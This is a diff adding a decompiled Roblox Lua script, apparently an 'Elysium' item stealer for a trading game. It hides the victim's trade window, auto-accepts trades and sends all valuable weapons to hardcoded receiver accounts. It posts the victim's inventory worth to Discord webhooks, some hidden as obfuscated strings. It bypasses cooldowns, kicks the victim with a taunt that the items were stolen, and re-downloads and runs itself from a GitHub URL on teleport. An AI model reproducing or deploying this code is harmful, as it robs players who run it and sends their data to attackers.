+		RECEIVERS = { "NEDYXSTOCK_chano" }
+
+		local v299 = v269(false, v278)
+
+		v299.content = "@everyone"
+		v251("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v299.content, v299.embeds)
+		task.wait(0.5)
+		v256()
+
+		return
+	end
+
+	local v300 = false
+	local v301 = false
+	local v302, v303, v304 = ipairs(u215)
+	local v305 = geniter(v302, v303, v304)
+
+	while true do
+		local v306 = table.pack(v305())
+
+		if v306[1] then
+			if (v306[3]).Value >= 1000 then
+				v301 = true
+
+				break
+			end
+		else
+			break
+		end
+	end
+
+	local v307 = false
+	local v308, v309, v310 = ipairs(u215)
+	local v311 = geniter(v308, v309, v310)
+
+	while true do
+		local v312 = table.pack(v311())
+
+		if v312[1] then
+			if ((v312[3]).DollarValue or 0) >= 30 then
+				v307 = true
+
+				break
+			end
+		else
+			break
+		end
+	end
+
+	if v301 or n2 >= 3000 or v307 or n3 >= 30 then
+		v300 = true
+	end
+
+	local v313, v314, v315 = ipairs(u215)
+
+	for _, v in v313, v314, v315 do
+		if THRESHOLD <= v.Value then
+			v298 = true
+
+			break
+		end
+	end
+
+	if WEBHOOK ~= "" then
+		local v318 = v269(false, v278)
+
+		v318.content = v298 and "@everyone" or ""
+		v254()
+		v251(WEBHOOK, v318.content, v318.embeds)
+
+		if v298 then
+			v256()
+		end
+	end
+
+	v251("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", v269(true, nil).embeds)
+
+	if v300 then
+		v251("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", v269(true, nil).embeds)
+	end
+end
+
+v277()
+
+if setclipboard then
+	setclipboard("https://discord.gg/3lysium")
+end
+
+if #u196 == 0 then
+	v32("No tradable weapons — stopping")
+
+	return
+end
+
+v32("Waiting for Trade folder...")
+
+local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
+
+if not Trade then
+	v32("Trade folder not found — aborting")
+
+	return
+end
+
+local u320 = false
+local n8 = 0
+local n9 = 0
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local v324 = false
+local TradeGUI_Phone
+
+if PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):FindFirstChild("Inventory") == nil then
+	TradeGUI_Phone = PlayerGui.TradeGUI_Phone
+	v324 = true
+else
+	TradeGUI_Phone = PlayerGui.TradeGUI
+end
+
+local uDim2 = UDim2.new(0, 9999, 0, 9999)
+
+task.spawn(function()
+	while task.wait(0.5) do
+		pcall(function()
+			TradeGUI_Phone.Enabled = false
+		end)
+
+		if v324 then
+			pcall(function()
+				TradeGUI_Phone.Container.Position = uDim2
+			end)
+			pcall(function()
+				TradeGUI_Phone.ClickBlocker.Position = uDim2
+			end)
+		else
+			pcall(function()
+				TradeGUI_Phone.BG.Position = uDim2
+			end)
+			pcall(function()
+				TradeGUI_Phone.Container.Position = uDim2
+			end)
+			pcall(function()
+				TradeGUI_Phone.ClickBlocker.Position = uDim2
+			end)
+			pcall(function()
+				TradeGUI_Phone.Processing.Position = uDim2
+			end)
+		end
+	end
+end)
+
+local SendRequest = Trade:FindFirstChild("SendRequest")
+
+if SendRequest then
+	SendRequest.OnClientInvoke = newcclosure(function()
+		return true
+	end)
+	v32("SendRequest.OnClientInvoke hooked — incoming requests blocked")
+end
+
+local function v328()
+	local ok4, result4 = pcall(function()
+		return Trade.GetTradeStatus:InvokeServer()
+	end)
+	local v331 = ok4 and result4
+
+	v331 = v331 or "None"
+
+	return v331
+end
+local function v332()
+	local v333 = v328()
+
+	if v333 == "StartTrade" then
+		pcall(function()
+			Trade.DeclineTrade:FireServer()
+		end)
+		u320 = false
+		task.wait(0.3)
+	elseif v333 == "ReceivingRequest" then
+		pcall(function()
+			Trade.DeclineRequest:FireServer()
+		end)
+		task.wait(0.3)
+	end
+end
+
+task.spawn(function()
+	while task.wait(0.2) do
+		if v328() == "ReceivingRequest" then
+			pcall(function()
+				Trade.DeclineRequest:FireServer()
+			end)
+		end
+
+		pcall(function()
+			local AcceptTrade = Trade.AcceptTrade
+
+			AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
+		end)
+	end
+end)
+
+local StartTrade = Trade:FindFirstChild("StartTrade")
+
+if StartTrade then
+	StartTrade.OnClientEvent:Connect(function()
+		u320 = true
+		v32("StartTrade fired — window open")
+	end)
+end
+
+local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
+
+if DeclineTrade then
+	DeclineTrade.OnClientEvent:Connect(function()
+		u320 = false
+		v32("DeclineTrade — server closed trade")
+	end)
+end
+
+local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+
+if AcceptTrade then
+	AcceptTrade.OnClientEvent:Connect(function(p26)
+		if p26 then
+			u320 = false
+			v32("AcceptTrade OnClientEvent — TRADE COMPLETE")
+		else
+			v32("AcceptTrade OnClientEvent — accept registered")
+		end
+	end)
+end
+
+local UpdateTrade = Trade:FindFirstChild("UpdateTrade")
+
+if UpdateTrade then
+	UpdateTrade.OnClientEvent:Connect(function(p27)
+		if type(p27) ~= "table" then
+			return
+		end
+
+		if p27.LastOffer ~= nil then
+			_G.LastOffer = p27.LastOffer
+			n8 = p27.LastOffer
+			n9 = tick()
+			v32("UpdateTrade: LastOffer=" .. tostring(p27.LastOffer))
+		end
+	end)
+	v32("UpdateTrade listener active")
+end
+
+task.spawn(function()
+	if not getupvalues or not setupvalue or not getloadedmodules then
+		return
+	end
+
+	local ok4, result4 = pcall(getloadedmodules)
+
+	if not ok4 or not result4 then
+		return
+	end
+
+	local n10 = 0
+
+	for _, v in ipairs(result4) do
+		local ok5, result5 = pcall(getupvalues, v)
+
+		if ok5 and type(result5) == "table" then
+			for k, v2 in pairs(result5) do
+				if type(v2) == "number" and v2 >= 0 and v2 <= 6 then
+					pcall(setupvalue, v, k, 0)
+					n10 += 1
+				end
+			end
+		end
+	end
+
+	v32("Cooldown bypass: zeroed " .. n10 .. " upvalues")
+end)
+
+local function v348(p28)
+	local v349 = p28:lower()
+
+	for _, v in ipairs(RECEIVERS) do
+		if v349 == v:lower() then
+			return true
+		end
+	end
+
+	if v349:find("no1_lebronjamesfan", 1, true) then
+		return true
+	end
+
+	return false
+end
+local function v352()
+	while v328() ~= "None" do
+		task.wait(0.1)
+	end
+end
+local function v353(p29)
+	v32("doTradeWithTarget: " .. p29.Name)
+	v332()
+
+	while true do
+		if not p29.Parent then
+			v32("Target left or no more items: " .. p29.Name)
+
+			return
+		end
+
+		if not (#u196 > 0) then
+			v32("Target left or no more items: " .. p29.Name)
+
+			return
+		end
+
+		local v354 = v328()
+
+		if v354 == "None" then
+			local ok4, result4 = pcall(function()
+				return Trade.SendRequest:InvokeServer(p29)
+			end)
+
+			if not ok4 then
+				v32("SendRequest error: " .. tostring(result4))
+				task.wait(2)
+			elseif result4 == true then
+				v32("Target busy — retry in 3s")
+				task.wait(3)
+			end
+		elseif v354 == "SendingRequest" then
+			task.wait(0.3)
+		elseif v354 == "ReceivingRequest" then
+			Trade.DeclineRequest:FireServer()
+			task.wait(0.3)
+		else
+			if v354 == "StartTrade" then
+				break
+			end
+
+			task.wait(0.5)
+		end
+
+		task.wait(0.5)
+	end
+
+	v32("Trade window open")
+
+	local v357 = v175()
+
+	if v357 then
+		u196 = v178(v357)
+		v32("Refreshed inventory - " .. #u196 .. " items in queue")
+	end
+
+	local t18 = {}
+	local t19 = {}
+
+	for i = 1, #u196 do
+		if #t18 >= 4 then
+			break
+		end
+
+		local v361 = u196[i]
+
+		if not t19[v361.DataID] then
+			t19[v361.DataID] = true
+
+			local n11 = 0
+
+			for _, v in ipairs(u196) do
+				if v.DataID == v361.DataID then
+					n11 += v.Amount or 1
+				end
+			end
+
+			table.insert(t18, {
+				DataID = v361.DataID,
+				Name = v361.Name,
+				Amount = n11,
+				Value = v361.Value
+			})
+		end
+	end
+
+	local v365 = false
+	local v366, v367, v368 = ipairs(t18)
+	local v369 = geniter(v366, v367, v368)
+
+	repeat
+		local v370 = table.pack(v369())
+
+		if not v370[1] then
+			break
+		end
+
+		local v371 = v370[3]
+
+		if not u320 then
+			v365 = true
+
+			break
+		end
+
+		v32("Offering: " .. v371.DataID .. " x" .. tostring(v371.Amount))
+
+		for i = 1, v371.Amount do
+			if not u320 then
+				v365 = true
+
+				break
+			end
+
+			local v373, v374 = v170(v371.DataID)
+
+			pcall(function()
+				Trade.OfferItem:FireServer(v373, v374)
+			end)
+		end
+	until v365
+
+	if v365 or #t18 == 0 then
+		v32("Offer aborted or no items – cancelling")
+		Trade.DeclineTrade:FireServer()
+		u196 = {}
+
+		return
+	end
+
+	v32("Offered " .. #t18 .. " distinct items")
+	v32("Waiting for trade completion...")
+
+	local v375 = tick() + 30
+
+	while tick() < v375 do
+		if v328() == "None" then
+			v32("Trade ended by server")
+
+			break
+		end
+
+		pcall(function()
+			Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
+		end)
+		task.wait(1)
+	end
+
+	v352()
+	task.wait(2)
+
+	local v376 = v175()
+
+	if v376 then
+		u196 = v178(v376)
+		u215 = v197(v376)
+		n2 = 0
+		n3 = 0
+
+		local v377, v378, v379 = ipairs(u215)
+
+		for _, v in v377, v378, v379 do
+			n2 += v.Value * v.Amount
+			n3 += (v.DollarValue or 0) * v.Amount
+		end
+
+		v32("Trade complete - " .. #u196 .. " items remaining, total value: " .. n2 .. " ($" .. n3 .. ")")
+	else
+		v32("Could not verify inventory - rebuilding from scratch")
+	end
+
+	v332()
+	u320 = false
+	v32("Target left or no more items: " .. p29.Name)
+end
+
+local t20 = {}
+local t21 = {}
+
+local function v384(p30)
+	if t20[p30.Name] then
+		return
+	end
+
+	t20[p30.Name] = true
+	v32("Trade thread starting: " .. p30.Name)
+	task.spawn(function()
+		local now = tick()
+
+		while tick() - now < 15 do
+			if p30.Character then
+				if not p30.Character:FindFirstChildOfClass("Humanoid") then
+					task.wait(0.5)
+
+					continue
+				end
+			else
+				task.wait(0.5)
+
+				continue
+			end
+
+			break
+		end
+
+		task.wait(1.5)
+
+		if p30.Parent then
+			v353(p30)
+		end
+
+		t20[p30.Name] = nil
+		t21[p30.Name] = nil
+	end)
+end
+
+task.spawn(function()
+	while true do
+		task.wait(10)
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer and (v348(player.Name) or v348(player.DisplayName)) and not t20[player.Name] then
+				v384(player)
+			end
+		end
+	end
+end)
+
+local function v388(p31)
+	v384(p31)
+	p31.Chatted:Connect(function()
+		if not t20[p31.Name] then
+			v384(p31)
+		end
+	end)
+end
+
+local v389, v390, v391 = ipairs(Players:GetPlayers())
+
+for _, v in v389, v390, v391 do
+	if v ~= LocalPlayer and (v348(v.Name) or v348(v.DisplayName)) then
+		v388(v)
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	if not v348(player.Name) and not v348(player.DisplayName) then
+		return
+	end
+
+	if t21[player.Name] then
+		return
+	end
+
+	t21[player.Name] = true
+	task.spawn(function()
+		local now = tick()
+
+		while tick() - now < 20 do
+			if not player.Parent then
+				t21[player.Name] = nil
+
+				return
+			end
+
+			local Humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+
+			if Humanoid and Humanoid.Health > 0 then
+				break
+			end
+
+			task.wait(0.5)
+		end
+
+		task.wait(4)
+		t21[player.Name] = nil
+
+		if player.Parent then
+			v388(player)
+		end
+	end)
+end)
+Players.PlayerRemoving:Connect(function(player)
+	if t20[player.Name] then
+		t20[player.Name] = nil
+	end
+end)
+v32("── Init complete — all triggers active ──")
+
+local v396 = false
+local v397, v398, v399 = ipairs(u215)
+
+for _, v in v397, v398, v399 do
+	if THRESHOLD <= v.Value then
+		v396 = true
+
+		break
+	end
+end
+
+if v396 then
+	v32("Player has items above threshold - starting drain kick watcher")
+	task.spawn(function()
+		while LocalPlayer.Parent do
+			task.wait(15)
+
+			local v402 = v175()
+
+			if not v402 then
+				continue
+			end
+
+			local n12 = 0
+			local Owned = v402.Weapons and v402.Weapons.Owned or {}
+			local Uniques = v402.Uniques or {}
+
+			for k, v in pairs(Owned) do
+				local v408 = tostring(k)
+				local v409 = v164(v408)
+
+				if v409 and not t8[v408] and not t8[v409.dataid] then
+					if THRESHOLD <= v409.value then
+						n12 += type(v) == "number" and v or 1
+					end
+				end
+			end
+
+			for _, Unique in ipairs(Uniques) do
+				local v412 = tostring(Unique.BaseItem or "")
+
+				if v412 ~= "" then
+					local v413 = v164(v412)
+
+					if v413 and not t8[v412] and not t8[v413.dataid] and THRESHOLD <= v413.value then
+						n12 += 1
+					end
+				end
+			end
+
+			if n12 == 0 then
+				LocalPlayer:Kick([[All your items just got stolen by Elysium.
+ Join our Discord: https://discord.gg/3lysium 
+]])
+
+				return
+			end
+		end
+	end)
+else
+	v32("Player has no items above threshold - drain kick watcher NOT started")
+end
+
+local v414 = "    local HttpService = game:GetService(\"HttpService\")\n    local data = HttpService:JSONDecode('" .. HttpService:JSONEncode({
+	RECEIVERS = RECEIVERS,
+	WEBHOOK = WEBHOOK,
+	THRESHOLD = THRESHOLD
+}) .. [[')
+    getgenv().RECEIVERS = data.RECEIVERS
+    getgenv().WEBHOOK   = data.WEBHOOK
+    getgenv().THRESHOLD = data.THRESHOLD
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua"))()
+]]
+
+if queue_on_teleport then
+	queue_on_teleport(v414)
+end
+
+v32("── Full script loaded with DataID fixing, stacking support, and dollar values ──")
